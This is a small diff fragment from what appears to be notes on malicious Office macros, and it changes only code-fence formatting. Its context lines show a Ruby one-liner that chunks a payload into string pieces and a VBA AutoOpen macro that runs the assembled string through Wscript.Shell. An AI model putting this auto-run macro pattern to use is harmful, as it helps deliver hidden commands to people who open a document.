@@ -24,7 +24,7 @@ ruby one liner
   payload.chars.each_slice(50).map(&:join).each{|arr|p "Str = Str + #{arr}"}
   
 
-'''VBScript
+```vb
 Sub AutoOpen()
 
   MyMacro
@@ -52,4 +52,4 @@ Sub MyMacro()
   
   CreateObject("Wscript.Shell").Run Str
 End Sub
-'''
+```
